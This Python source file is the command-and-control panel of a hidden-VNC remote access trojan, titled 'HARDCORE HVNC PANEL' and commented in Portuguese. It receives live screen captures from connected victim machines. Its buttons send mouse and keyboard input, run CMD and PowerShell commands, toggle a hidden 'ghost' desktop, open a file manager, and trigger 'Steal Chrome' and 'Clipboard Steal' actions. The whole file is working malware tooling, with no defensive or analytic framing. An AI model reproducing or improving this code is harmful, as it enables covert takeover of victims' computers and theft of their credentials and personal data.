import socket
import threading
import tkinter as tk
from tkinter import ttk, messagebox, filedialog
from PIL import Image, ImageTk
import io, os, datetime, json, base64

##### CONFIGURAÇÕES OTIMIZADAS #####
SERVER_IP = "0.0.0.0"
SERVER_PORT = 5555
IMG_CHUNK = 65536  # Aumentado para melhor performance
DEBUG_IMG_DIR = "debug_imgs"
USE_AES = False  # True se client envia imagem criptografada!
AES_KEY = b'0123456789abcdef'  # 16 bytes chave
AES_IV = b'abcdef9876543210'   # 16 bytes IV

# OTIMIZAÇÃO: Cache e controle de performance
clients = []
addresses = []
screens = {}        # id -> ImageTk
info = {}           # id -> meta/status/logs
image_cache = {}    # Cache de imagens para reduzir flickering
last_image_hash = {}  # Hash da última imagem para detectar mudanças
frame_skip_counter = {}  # Contador para pular frames duplicados
performance_stats = {}  # Estatísticas de performance

# OTIMIZAÇÃO: Função para processamento assíncrono de comandos
def process_command_async(idx, cmd_data):
    """Processa comandos de forma assíncrona para não bloquear recepção de imagens"""
    try:
        cmd_str = cmd_data.decode('utf-8', errors='ignore').strip()
        
        # Log otimizado para comandos
        if len(cmd_str) > 50:
            log(f"CMD[{idx}]: {cmd_str[:47]}...")
        else:
            log(f"CMD[{idx}]: {cmd_str}")
        
        # Tenta usar o módulo commands se disponível
        try:
            from commands import handle_response
            handle_response(idx, cmd_data)
        except ImportError:
            # Fallback: processamento básico de comandos
            if cmd_str.startswith('CHROME:'):
                log(f"Chrome data[{idx}]: {len(cmd_data)}B")
            elif cmd_str.startswith('CLIP:'):
                clipboard_data = cmd_str[5:].strip()
                log(f"Clipboard[{idx}]: {clipboard_data[:30]}...")
            elif cmd_str.startswith('CMD:') or cmd_str.startswith('PS:'):
                output = cmd_str[4:].strip()
                log(f"Shell[{idx}]: {output[:50]}...")
            elif cmd_str.startswith('SWITCH_DESKTOP:'):
                desktop = cmd_str[15:].strip()
                log(f"Desktop switch[{idx}]: {desktop}")
                
    except Exception as e:
        log(f"Erro processamento comando[{idx}]: {str(e)[:30]}")

if not os.path.exists(DEBUG_IMG_DIR): os.makedirs(DEBUG_IMG_DIR)

def decrypt_image(data):
    if not USE_AES:
        return data
    from Crypto.Cipher import AES
    cipher = AES.new(AES_KEY, AES.MODE_CBC, AES_IV)
    # AES exige múltiplo de 16 bytes, ajuste padding se necessário!
    if len(data) % 16 != 0:
        pad = 16 - (len(data) % 16)
        data += b'\x00' * pad
    return cipher.decrypt(data)

###### GUI #####################
root = tk.Tk()
root.title("HARDCORE HVNC PANEL")
root.geometry("1500x900")
style = ttk.Style(); style.theme_use("clam")
mainframe = ttk.Frame(root); mainframe.pack(fill="both", expand=True)
tree = ttk.Treeview(mainframe, columns=("ip", "status", "last"), show="headings")
tree.heading("ip", text="IP"); tree.heading("status", text="Status"); tree.heading("last", text="Last Seen")
tree.pack(side="left", fill="y", expand=False)
canvas = tk.Canvas(mainframe, bg="#232323", width=1280, height=720)
canvas.pack(side="left", fill="both", expand=True)

# Handler de eventos de mouse para controle direto
def on_canvas_click(event):
    if selected_client[0] is not None:
        # Converte coordenadas do canvas para coordenadas da tela da vítima
        x = int(event.x)
        y = int(event.y)
        send_mouse_click(x, y, "LCLICK")

def on_canvas_right_click(event):
    if selected_client[0] is not None:
        x = int(event.x)
        y = int(event.y)
        send_mouse_click(x, y, "RCLICK")

def on_canvas_double_click(event):
    if selected_client[0] is not None:
        x = int(event.x)
        y = int(event.y)
        send_mouse_click(x, y, "DCLICK")

canvas.bind("<Button-1>", on_canvas_click)
canvas.bind("<Button-3>", on_canvas_right_click)
canvas.bind("<Double-Button-1>", on_canvas_double_click)
cmd_entry = ttk.Entry(root, width=80); cmd_entry.pack(side="top", fill="x", padx=8, pady=4)
btn_frame = ttk.Frame(root); btn_frame.pack(side="top")
btn_cmd = ttk.Button(btn_frame, text="CMD", width=20)
btn_ps = ttk.Button(btn_frame, text="PowerShell", width=20)
btn_chrome = ttk.Button(btn_frame, text="Steal Chrome", width=20)
btn_clip = ttk.Button(btn_frame, text="Clipboard Steal", width=20)
btn_file = ttk.Button(btn_frame, text="File Manager", width=20)

# Botões de teclas comuns
btn_enter = ttk.Button(btn_frame, text="Enter", width=10)
btn_tab = ttk.Button(btn_frame, text="Tab", width=10)
btn_esc = ttk.Button(btn_frame, text="ESC", width=10)
btn_win = ttk.Button(btn_frame, text="Win", width=10)

btn_cmd.pack(side="left", padx=2); btn_ps.pack(side="left", padx=2)
btn_chrome.pack(side="left", padx=2); btn_clip.pack(side="left", padx=2); btn_file.pack(side="left", padx=2)
btn_enter.pack(side="left", padx=2); btn_tab.pack(side="left", padx=2); btn_esc.pack(side="left", padx=2); btn_win.pack(side="left", padx=2)
logbox = tk.Text(root, height=10, bg="#191919", fg="lime"); logbox.pack(side="bottom", fill="x", padx=8)
selected_client = [None]

def log(msg):
    now = datetime.datetime.now().strftime("[%H:%M:%S]")
    logbox.insert("end", now + " " + msg + "\n"); logbox.see("end")

def update_tree():
    try:
        tree.delete(*tree.get_children())
        for i, c in enumerate(clients):
            ip = addresses[i]
            st = info.get(i, {}).get("status", "ONLINE")
            last = info.get(i, {}).get("last", "--")
            tree.insert("", "end", iid=str(i), values=(ip, st, last))
    except Exception as e:
        log(f"Tree update error: {e}")

def select_tree(ev):
    if tree.selection():
        try:
            selected_client[0] = int(tree.selection()[0])
        except:
            selected_client[0] = None
tree.bind("<<TreeviewSelect>>", select_tree)

def grab_screen(idx, img_bytes):
    import hashlib
    import time
    
    start_time = time.time()
    
    try:
        # OTIMIZAÇÃO: Validação rápida e eficiente
        if len(img_bytes) < 1000:  # Mínimo para JPEG válido
            return  # Log silencioso para reduzir spam
            
        # Verifica assinatura JPEG rapidamente
        if len(img_bytes) < 4 or img_bytes[:2] != b'\xff\xd8':
            return  # Log silencioso
            
        # Procura pelo fim do JPEG de forma otimizada
        jpeg_end = img_bytes.rfind(b'\xff\xd9')
        if jpeg_end == -1:
            return  # Log silencioso
            
        # Extrai apenas dados JPEG válidos
        clean_jpeg = img_bytes[:jpeg_end+2]
        
        # Validação rápida do tamanho
        if len(clean_jpeg) < 1000:
            return  # Log silencioso
        
        # OTIMIZAÇÃO CRÍTICA: Detecção de mudanças por hash
        image_hash = hashlib.md5(clean_jpeg).hexdigest()
        
        # Pula frame se for idêntico ao anterior
        if idx in last_image_hash and last_image_hash[idx] == image_hash:
            if idx not in frame_skip_counter:
                frame_skip_counter[idx] = 0
            frame_skip_counter[idx] += 1
            
            # Log apenas a cada 50 frames pulados
            if frame_skip_counter[idx] % 50 == 0:
                log(f"Frames duplicados pulados: {frame_skip_counter[idx]}")
            return
        
        # Atualiza hash da última imagem
        last_image_hash[idx] = image_hash
        if idx in frame_skip_counter:
            frame_skip_counter[idx] = 0
        
        # OTIMIZAÇÃO CRÍTICA: Processamento inteligente com cache
        try:
            # Carrega imagem diretamente da memória (otimizado)
            img_stream = io.BytesIO(clean_jpeg)
            img = Image.open(img_stream)
            
            # OTIMIZAÇÃO: Cache de dimensões do canvas
            canvas_width = canvas.winfo_width() or 1280
            canvas_height = canvas.winfo_height() or 720
            
            # Cache da chave de redimensionamento
            resize_key = f"{img.width}x{img.height}_{canvas_width}x{canvas_height}"
            
            # OTIMIZAÇÃO: Reutiliza cálculos de redimensionamento
            if resize_key not in image_cache:
                # Mantém proporção da imagem (cálculo uma vez)
                img_ratio = img.width / img.height
                canvas_ratio = canvas_width / canvas_height
                
                if img_ratio > canvas_ratio:
                    new_width = canvas_width
                    new_height = int(canvas_width / img_ratio)
                else:
                    new_height = canvas_height
                    new_width = int(canvas_height * img_ratio)
                
                image_cache[resize_key] = (new_width, new_height)
            else:
                new_width, new_height = image_cache[resize_key]
            
            # OTIMIZAÇÃO: Redimensionamento adaptativo
            if img.width != new_width or img.height != new_height:
                # Usa algoritmo mais rápido para imagens pequenas
                if img.width * img.height < 500000:  # < 500K pixels
                    img_resized = img.resize((new_width, new_height), Image.Resampling.BILINEAR)
                else:
                    img_resized = img.resize((new_width, new_height), Image.Resampling.LANCZOS)
            else:
                img_resized = img
            
            # Cria ImageTk otimizado
            imgTk = ImageTk.PhotoImage(img_resized)
            
            # OTIMIZAÇÃO: Atualização suave do canvas
            screens[idx] = imgTk
            
            # Atualiza canvas apenas se cliente selecionado
            if selected_client[0] == idx:
                canvas.delete("all")
                canvas.create_image(canvas_width//2, canvas_height//2, anchor='center', image=imgTk)
            
            # OTIMIZAÇÃO: Estatísticas de performance
            processing_time = time.time() - start_time
            
            if idx not in performance_stats:
                performance_stats[idx] = {'frames': 0, 'total_time': 0, 'avg_time': 0}
            
            performance_stats[idx]['frames'] += 1
            performance_stats[idx]['total_time'] += processing_time
            performance_stats[idx]['avg_time'] = performance_stats[idx]['total_time'] / performance_stats[idx]['frames']
            
            # Log otimizado (menos verboso)
            if idx not in info:
                info[idx] = {}
            if 'frame_count' not in info[idx]:
                info[idx]['frame_count'] = 0
            info[idx]['frame_count'] += 1
            
            # Log apenas a cada 25 frames com estatísticas
            if info[idx]['frame_count'] % 25 == 0:
                avg_time = performance_stats[idx]['avg_time'] * 1000  # ms
                log(f"Screen #{info[idx]['frame_count']}: {len(clean_jpeg)}b, {new_width}x{new_height}, {avg_time:.1f}ms avg")
                
        except Exception as img_error:
            # Log de erro mais conciso
            log(f"Erro processamento: {str(img_error)[:50]}")
            # Debug mínimo apenas para erros críticos
            if "cannot identify image file" in str(img_error).lower():
                debug_fname = f"{DEBUG_IMG_DIR}/corrupt_{idx}_{datetime.datetime.now().strftime('%H%M%S')}.jpg"
                with open(debug_fname, "wb") as f:
                    f.write(clean_jpeg[:5000])  # Apenas primeiros 5KB
                log(f"Imagem corrompida salva: {debug_fname}")
            
    except Exception as e:
        log(f"Screen error geral: {e}")
        # Debug mínimo apenas em caso de erro crítico
        try:
            debug_fname = f"{DEBUG_IMG_DIR}/critical_error_{idx}_{datetime.datetime.now().strftime('%H%M%S')}.bin"
            with open(debug_fname, "wb") as f:
                f.write(img_bytes[:2000] if len(img_bytes) > 2000 else img_bytes)
            log(f"Debug crítico salvo: {debug_fname}")
        except:
            pass

def handle_client(sock, idx):
    import time
    
    ip = addresses[idx]
    info[idx] = {"status": "ONLINE", "last": datetime.datetime.now().strftime("%d/%m %H:%M")}
    update_tree()
    
    # OTIMIZAÇÃO: Inicializa estatísticas de performance
    if idx not in performance_stats:
        performance_stats[idx] = {
            'frames': 0, 'total_time': 0, 'avg_time': 0,
            'bytes_received': 0, 'connection_start': time.time()
        }
    
    # CORREÇÃO CRÍTICA: Lê o token de sessão otimizado
    try:
        sock.settimeout(10.0)  # Timeout para token
        token_buffer = b""
        start_time = time.time()
        
        while time.time() - start_time < 5.0:  # Máximo 5s para token
            try:
                chunk = sock.recv(1)
                if not chunk:
                    break
                token_buffer += chunk
                if token_buffer.endswith(b"\n") or len(token_buffer) > 100:
                    break
            except socket.timeout:
                break
        
        session_token = token_buffer.decode('utf-8', errors='ignore').strip()
        if session_token.startswith('HVNC-'):
            log(f"Token válido: {session_token}")
            info[idx]['session_token'] = session_token
        else:
            log(f"Token inválido: {session_token[:30]}...")
    except Exception as e:
        log(f"Erro token: {str(e)[:30]}")
    
    # OTIMIZAÇÃO: Buffers com tamanho otimizado
    img_buffer = bytearray()  # Mais eficiente que bytes
    command_buffer = bytearray()
    last_activity = time.time()
    
    while True:
        try:
            # OTIMIZAÇÃO: Timeout adaptativo baseado na atividade
            time_since_activity = time.time() - last_activity
            if time_since_activity > 30:  # 30s sem atividade
                sock.settimeout(5.0)  # Timeout mais longo
            else:
                sock.settimeout(1.0)  # Timeout rápido para atividade
            
            chunk = sock.recv(IMG_CHUNK)
            if not chunk: 
                break
            
            last_activity = time.time()
            performance_stats[idx]['bytes_received'] += len(chunk)
            
            # OTIMIZAÇÃO: Detecção rápida de comandos
            chunk_start = chunk[:20]  # Apenas primeiros 20 bytes para detecção
            chunk_str = chunk_start.decode('utf-8', errors='ignore')
            
            # Lista otimizada de comandos
            command_prefixes = ["CHROME:", "CLIP:", "CMD:", "PS:", "FILEMANAGER:", "KEYBOARD:", "MOUSE:", "SWITCH_DESKTOP:"]
            is_command = any(chunk_str.startswith(cmd) for cmd in command_prefixes)
            
            if is_command:
                # OTIMIZAÇÃO: Processamento assíncrono de comandos
                command_buffer.extend(chunk)
                if b"\n" in command_buffer or len(command_buffer) > 2000:
                    try:
                        # Processa comando em thread separada
                        import threading
                        cmd_data = bytes(command_buffer)
                        threading.Thread(
                            target=process_command_async, 
                            args=(idx, cmd_data), 
                            daemon=True
                        ).start()
                    except Exception as cmd_error:
                        log(f"Erro comando: {str(cmd_error)[:30]}")
                    command_buffer.clear()
                continue
            
            # CORREÇÃO: Processamento melhorado do marcador ENDIMG
            if b"ENDIMG" in chunk:
                # Encontra a posição exata do marcador
                endimg_pos = chunk.find(b"ENDIMG")
                img_part = chunk[:endimg_pos]
                img_buffer += img_part
                
                # Processa a imagem completa apenas se tiver tamanho adequado
                if len(img_buffer) > 1000:  # Mínimo para JPEG válido
                    try:
                        img_data = decrypt_image(img_buffer)
                        log(f"Recebidos {len(img_buffer)} bytes, imagem: {len(img_data)} bytes")
                        
                        # Processa em thread separada para não bloquear recepção
                        import threading
                        threading.Thread(target=grab_screen, args=(idx, img_data), daemon=True).start()
                        
                        info[idx]["last"] = datetime.datetime.now().strftime("%d/%m %H:%M")
                        update_tree()
                    except Exception as e:
                        log(f"Erro ao processar imagem: {e}")
                else:
                    log(f"Imagem muito pequena descartada: {len(img_buffer)} bytes")
                
                # Limpa buffer e processa dados restantes após ENDIMG
                img_buffer = b""
                remaining_data = chunk[endimg_pos + 6:]  # 6 = len("ENDIMG")
                if remaining_data:
                    img_buffer += remaining_data
            else:
                # OTIMIZAÇÃO: Acumula dados de imagem com controle de memória
                img_buffer.extend(chunk)
                
                # OTIMIZAÇÃO: Controle de memória mais agressivo
                if len(img_buffer) > 5 * 1024 * 1024:  # 5MB máximo
                    log(f"Buffer overflow: {len(img_buffer)}B")
                    img_buffer = img_buffer[-512:]  # Mantém apenas 512B
        except Exception as e:
            info[idx]["status"] = "OFFLINE"
            update_tree()
            log(f"Cliente {ip} desconectou: {e}")
            break
    sock.close()

# OTIMIZAÇÃO: Função base para envio de comandos com retry e timeout
def send_command_base(command_type, command, timeout=5.0):
    """Função base otimizada para envio de comandos"""
    idx = selected_client[0]
    if idx is None or idx >= len(clients):
        log(f"Cliente inválido para {command_type}")
        return False
    
    try:
        client_sock = clients[idx]
        if not client_sock:
            log(f"Socket inválido para {command_type}")
            return False
        
        # OTIMIZAÇÃO: Timeout para envio
        client_sock.settimeout(timeout)
        message = f"{command_type}:{command}\n".encode('utf-8')
        
        # OTIMIZAÇÃO: Envio com retry
        for attempt in range(2):
            try:
                client_sock.send(message)
                log(f"{command_type}[{idx}]: {command[:40]}{'...' if len(command) > 40 else ''}")
                return True
            except socket.timeout:
                if attempt == 0:
                    log(f"Timeout {command_type}, tentando novamente...")
                    continue
                else:
                    log(f"Timeout final {command_type}")
                    return False
            except Exception as e:
                log(f"Erro {command_type}: {str(e)[:30]}")
                return False
    except Exception as e:
        log(f"Erro crítico {command_type}: {str(e)[:30]}")
        return False

def send_command(prefix):
    idx = selected_client[0]
    if idx is None: messagebox.showinfo("Alert", "Selecione cliente!"); return
    cmd = cmd_entry.get()
    try: clients[idx].send((prefix+cmd).encode())
    except: log("Erro ao enviar comando: desconectado?")
    log(f"<< {prefix.strip(':')} >> {cmd}")

def send_mouse_click(x, y, click_type="LCLICK"):
    idx = selected_client[0]
    if idx is None: return
    try: 
        cmd = f"MOUSE:{x},{y},{click_type}"
        clients[idx].send(cmd.encode())
        log(f"<< MOUSE >> {x},{y} {click_type}")
    except: log("Erro ao enviar mouse: desconectado?")

def send_keyboard(key_code):
    idx = selected_client[0]
    if idx is None: return
    try: 
        cmd = f"KEYBOARD:{key_code}"
        clients[idx].send(cmd.encode())
        log(f"<< KEYBOARD >> {key_code}")
    except: log("Erro ao enviar teclado: desconectado?")

# OTIMIZAÇÃO: Funções de comando otimizadas
def send_cmd(): 
    cmd = cmd_entry.get()
    return send_command_base("CMD", cmd)

def send_ps(): 
    cmd = cmd_entry.get()
    return send_command_base("PS", cmd)

def send_chrome():
    return send_command_base("CHROME", "")

def send_clipboard():
    return send_command_base("CLIP", "")

def send_filemanager():
    return send_command_base("FILEMANAGER", "")

# OTIMIZAÇÃO: Funções auxiliares para comandos específicos
def send_chrome_command(command):
    return send_command_base("CHROME", command)

def send_clipboard_command(text):
    return send_command_base("CLIP", text)

def send_filemanager_command(command):
    return send_command_base("FILEMANAGER", command)

btn_cmd.config(command=send_cmd); btn_ps.config(command=send_ps)
btn_chrome.config(command=send_chrome)
btn_clip.config(command=send_clipboard)
btn_file.config(command=send_filemanager)

# Configura botões de teclas
btn_enter.config(command=lambda: send_keyboard(13))  # VK_RETURN
btn_tab.config(command=lambda: send_keyboard(9))     # VK_TAB
btn_esc.config(command=lambda: send_keyboard(27))    # VK_ESCAPE
btn_win.config(command=lambda: send_keyboard(91))    # VK_LWIN

def send_desktop_switch(desktop_type="ghost"):
    """OTIMIZAÇÃO: Envia comando otimizado para alternar entre desktops"""
    if desktop_type not in ["ghost", "main"]:
        log(f"Tipo de desktop inválido: {desktop_type}")
        return False
    
    success = send_command_base("SWITCH_DESKTOP", desktop_type, timeout=3.0)
    if success:
        log(f"Desktop alternado para: {desktop_type}")
        # OTIMIZAÇÃO: Atualiza estado do cliente
        if selected_client and selected_client[0] is not None:
            idx = selected_client[0]
            if idx in info:
                info[idx]['current_desktop'] = desktop_type
                update_tree()
    else:
        log(f"Falha ao alternar para desktop: {desktop_type}")
    
    return success

# Botão para alternar entre desktop fantasma e principal
btn_switch = ttk.Button(btn_frame, text="Switch Desktop", width=12)
btn_switch.pack(side="left", padx=2)
btn_switch.config(command=send_desktop_switch)

def accept_clients():
    servsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    servsock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    servsock.bind((SERVER_IP, SERVER_PORT)); servsock.listen(25)
    
    # Configura timeout para os clientes
    def setup_client_socket(sock):
        sock.settimeout(5.0)  # 5 segundos timeout
        return sock
    log(f"PAINEL INICIADO: Escutando em {SERVER_IP}:{SERVER_PORT}")
    log(f"Aguardando conexões de clientes...")
    while True:
        try:
            log(f"Aguardando nova conexão...")
            sock, addr = servsock.accept()
            log(f"NOVA CONEXÃO RECEBIDA de {addr[0]}:{addr[1]}")
            sock = setup_client_socket(sock)  # Configura timeout
            clients.append(sock); addresses.append(addr[0])
            idx = len(clients)-1
            info[idx] = {"status": "ONLINE", "last": datetime.datetime.now().strftime("%d/%m %H:%M")}
            log(f"Cliente {addr[0]} conectado com índice {idx}")
            threading.Thread(target=handle_client, args=(sock, idx), daemon=True).start()
            update_tree()
        except Exception as e:
            log(f"ERRO ao aceitar conexão: {e}")

threading.Thread(target=accept_clients, daemon=True).start()
root.mainloop()